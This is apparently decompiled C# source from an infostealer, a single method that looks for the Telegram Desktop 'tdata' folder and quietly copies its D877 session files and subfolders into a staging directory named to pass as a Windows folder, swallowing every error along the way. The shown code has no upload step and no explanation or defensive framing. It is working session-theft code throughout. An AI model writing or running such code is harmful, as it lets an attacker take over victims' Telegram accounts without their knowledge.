using System;
using System.IO;

namespace tdata
{
	// Token: 0x02000002 RID: 2
	internal class telegram
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public static bool telegramData()
		{
			bool result;
			try
			{
				bool flag = Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Telegram Desktop/tdata");
				if (flag)
				{
					try
					{
						Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Telegram");
						string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Telegram Desktop/tdata");
						for (int i = 0; i < files.Length; i++)
						{
							bool flag2 = files[i].StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Telegram Desktop/tdata\\D877");
							if (flag2)
							{
								FileInfo fileInfo = new FileInfo(files[i]);
								fileInfo.CopyTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Telegram/" + Path.GetFileName(files[i]));
							}
						}
					}
					catch
					{
					}
					try
					{
						string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Telegram Desktop/tdata");
						for (int j = 0; j < directories.Length; j++)
						{
							string name = new DirectoryInfo(directories[j]).Name;
							bool flag3 = directories[j].StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Telegram Desktop/tdata\\D877");
							if (flag3)
							{
								string[] files2 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Telegram Desktop/tdata\\" + name);
								Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Telegram\\" + name);
								for (int k = 0; k < files2.Length; k++)
								{
									FileInfo fileInfo2 = new FileInfo(files2[k]);
									fileInfo2.CopyTo(string.Concat(new string[]
									{
										Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
										"/Windows/Telegram/",
										name,
										"\\",
										Path.GetFileName(files2[k])
									}));
								}
							}
						}
					}
					catch
					{
					}
					result = true;
				}
				else
				{
					result = false;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
